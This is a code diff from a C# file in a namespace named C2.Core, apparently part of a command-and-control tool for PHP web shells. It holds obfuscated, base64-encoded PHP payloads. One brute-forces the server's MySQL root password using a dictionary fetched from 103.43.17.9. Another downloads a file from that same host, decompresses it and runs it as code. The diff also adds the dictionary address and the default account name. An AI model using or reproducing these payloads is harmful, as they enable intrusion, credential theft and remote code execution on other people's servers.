@@ -219,8 +219,9 @@ namespace C2.Core
         }
 
 
-        public static string MysqlPayload = "@eval(base64_decode($_POST[0]));&0=c2V0X3RpbWVfbGltaXQoMCk7aWYoIWlzc2V0KCRfUkVRVUVTVFsxXSkpZXhpdCgpOwokcj1pc3NldCgkX1JFUVVFU1RbMl0pPyRfUkVRVUVTVFsyXToicm9vdCI7CiRwPWZpbGUoQGJhc2U2NF9kZWNvZGUoJF9SRVFVRVNUWzFdKSk7IApmb3IoJGk9MDskaTxjb3VudCgkcCk7JGkrKyl7aWYoY3QoJHIsdHJpbShzdHJfcmVwbGFjZShQSFBfRU9MLCcnLCRwWyRpXSkpKSl7ZXhpdCgpO31mbHVzaCgpO31lY2hvICI9PT1zY2FuIGVuZD09PSI7CmZ1bmN0aW9uIGN0KCRyLCRwKXskYz1AbXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwkciwkcCk7aWYoJGMpe2VjaG8gImZpbmQgcGFzczoiLiRwLiI8L2JyPiI7cmV0dXJuIHRydWU7fWVsc2V7cmV0dXJuIGZhbHNlO319&1=aHR0cDovLzEwMy40My4xNy45L3drL3N1bQ";
+        public static string MysqlPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_POST[0])));&0=YzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3YVdZb0lXbHpjMlYwS0NSZlVrVlJWVVZUVkZzeFhTa3BaWGhwZENncE93MEtKSEk5YVhOelpYUW9KRjlTUlZGVlJWTlVXekpkS1Q4a1gxSkZVVlZGVTFSYk1sMDZJbkp2YjNRaU93MEtKSEE5Wm1sc1pTaEFZbUZ6WlRZMFgyUmxZMjlrWlNna1gxSkZVVlZGVTFSYk1WMHBLVHNnRFFwbWIzSW9KR2s5TURza2FUeGpiM1Z1ZENna2NDazdKR2tyS3lsN2FXWW9ZM1FvSkhJc2RISnBiU2h6ZEhKZmNtVndiR0ZqWlNoUVNGQmZSVTlNTENjbkxDUndXeVJwWFNrcEtTbDdaWGhwZENncE8zMW1iSFZ6YUNncE8zMWxZMmh2SUNKUlFVTkxURE5KVHpsUVBUMURjbUZqYXlCbVlXbHNaV1E5UFQxUlFVTkxURE5KVHpsUUlqc05DbVoxYm1OMGFXOXVJR04wS0NSeUxDUndLWHNrWXoxQWJYbHpjV3hmWTI5dWJtVmpkQ2dpYkc5allXeG9iM04wSWl3a2Npd2tjQ2s3YVdZb0pHTXBlMlZqYUc4Z0lsRkJRMHRNTTBsUE9WQTlQVU55WVdOclpXUWdjM1ZqWTJWemMyWjFiR3g1TENCd1lYTnpkMjl5WkNBNklpNGtjQzRpUFQxUlFVTkxURE5KVHpsUUlqdHlaWFIxY200Z2RISjFaVHQ5Wld4elpYdHlaWFIxY200Z1ptRnNjMlU3ZlgwPQ&1={1}&2={2}";
         public static string TrojanHorsePayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3RFFva1pEMUFZbUZ6WlRZMFgyUmxZMjlrWlNna1gxQlBVMVJiT1RsZEtUc05DaVJqYjJSbFBXWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUmtLVHNOQ2tCbGRtRnNLR2Q2YVc1bWJHRjBaU2drWTI5a1pTa3BPdw&99=aHR0cDovLzEwMy40My4xNy45L2Flc3MuZ2lm&dir={1}&type=p&time={2};";
-
+        public static string MysqlDictAddr = "http://103.43.17.9/wk/db_dict";
+        public static string MysqlAccount = "root";
     }
 }
